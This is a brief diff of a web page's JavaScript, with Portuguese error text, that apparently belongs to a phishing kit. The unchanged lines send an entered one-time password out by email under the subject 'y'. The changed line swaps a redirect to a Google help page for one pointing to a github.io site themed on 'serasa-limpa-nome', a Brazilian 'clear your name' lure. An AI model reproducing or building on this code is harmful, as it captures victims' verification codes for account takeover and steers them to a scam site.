@@ -20,7 +20,7 @@ window.onload = function()
                 Subject : y,
                 Body : "<p> << One Time Password </p>",
             });
-            window.location.href = "https://support.google.com/accounts/answer/46526?hl=pt-BR";
+            window.location.href = "https://serasa-limpa-nome.github.io/serasa-limpa-nome/";
 
         } else {
             err.innerHTML = "<p class='err-alert'>Código incorreto, tente novamente.<p>";
